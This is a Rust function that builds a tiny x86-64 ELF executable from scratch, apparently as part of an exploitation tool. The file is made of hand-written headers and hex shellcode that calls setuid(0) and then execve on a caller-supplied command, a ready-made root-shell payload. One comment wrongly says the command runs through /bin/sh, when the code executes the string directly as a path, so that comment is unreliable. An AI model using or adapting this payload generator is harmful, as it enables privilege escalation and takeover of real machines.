/// Dynamically builds a minimal 64-bit ELF executable payload at runtime.
/// 
/// The generated ELF is designed to be as small as possible and executes a specific
/// shell command with root privileges after performing setuid(0).
///
/// # Arguments
/// * `command` - The shell command to be executed by /bin/sh.
pub fn build_elf_payload(command: &str) -> Vec<u8> {
    let mut payload = Vec::new();
    
    // --- 1. ELF Header (64 bytes) ---
    // Standard 64-bit ELF identification (Magic, Class, Endianness, Version).
    payload.extend_from_slice(b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00"); 
    payload.extend_from_slice(&2u16.to_le_bytes()); // e_type: ET_EXEC (Executable file)
    payload.extend_from_slice(&62u16.to_le_bytes()); // e_machine: EM_X86_64 (x86-64 architecture)
    payload.extend_from_slice(&1u32.to_le_bytes()); // e_version: 1
    // e_entry: Entry point virtual address. We set it to 0x400078 (Base + Header size).
    payload.extend_from_slice(&0x400078u64.to_le_bytes()); 
    payload.extend_from_slice(&64u64.to_le_bytes()); // e_phoff: Program header offset (immediately after ELF header)
    payload.extend_from_slice(&0u64.to_le_bytes()); // e_shoff: Section header offset (none)
    payload.extend_from_slice(&0u32.to_le_bytes()); // e_flags: 0
    payload.extend_from_slice(&64u16.to_le_bytes()); // e_ehsize: Size of ELF header (64 bytes)
    payload.extend_from_slice(&56u16.to_le_bytes()); // e_phentsize: Size of one program header entry (56 bytes)
    payload.extend_from_slice(&1u16.to_le_bytes()); // e_phnum: Number of program header entries (1)
    payload.extend_from_slice(&0u16.to_le_bytes()); // e_shentsize: Size of section header entries (0)
    payload.extend_from_slice(&0u16.to_le_bytes()); // e_shnum: Number of section header entries (0)
    payload.extend_from_slice(&0u16.to_le_bytes()); // e_shstrndx: Section header string table index (0)

    // --- 2. Program Header (56 bytes) ---
    // Describes a segment in the ELF file that should be loaded into memory.
    payload.extend_from_slice(&1u32.to_le_bytes()); // p_type: PT_LOAD (Loadable segment)
    payload.extend_from_slice(&5u32.to_le_bytes()); // p_flags: PF_X | PF_R (Executable and Readable)
    payload.extend_from_slice(&0u64.to_le_bytes()); // p_offset: Offset in file (0)
    payload.extend_from_slice(&0x400000u64.to_le_bytes()); // p_vaddr: Virtual address in memory
    payload.extend_from_slice(&0x400000u64.to_le_bytes()); // p_paddr: Physical address (ignored)
    
    // We'll update p_filesz and p_memsz later once the full size is known.
    let size_placeholder_offset = payload.len();
    payload.extend_from_slice(&0u64.to_le_bytes()); // p_filesz: Size of segment in file
    payload.extend_from_slice(&0u64.to_le_bytes()); // p_memsz: Size of segment in memory
    payload.extend_from_slice(&0x1000u64.to_le_bytes()); // p_align: Segment alignment (4096 bytes)

    // --- 3. Shellcode ---
    // Compact x86-64 assembly to elevate privileges and run the command.
    let mut shellcode = Vec::new();
    // setuid(0): Ensures the process has full root privileges.
    shellcode.extend_from_slice(b"\x31\xc0\x31\xff\xb0\x69\x0f\x05"); 
    // lea rdi, [rip + 15]: Load the address of the command string below into RDI.
    shellcode.extend_from_slice(b"\x48\x8d\x3d\x0f\x00\x00\x00");     
    // execve(rdi, NULL, NULL): Execute /bin/sh with the command string.
    shellcode.extend_from_slice(b"\x31\xf6\x6a\x3b\x58\x99\x0f\x05"); 
    // exit(0): Cleanly exit the process if execve fails or returns.
    shellcode.extend_from_slice(b"\x31\xff\x6a\x3c\x58\x0f\x05");     
    
    payload.extend_from_slice(&shellcode);
    
    // Append the actual command string.
    payload.extend_from_slice(command.as_bytes());
    payload.push(0); // Null terminator for the C-style string.

    // --- 4. Finalize Headers ---
    // Update the size fields in the Program Header now that we know the final length.
    let total_size = payload.len() as u64;
    payload[size_placeholder_offset..size_placeholder_offset + 8].copy_from_slice(&total_size.to_le_bytes());
    payload[size_placeholder_offset + 8..size_placeholder_offset + 16].copy_from_slice(&total_size.to_le_bytes());

    payload
}
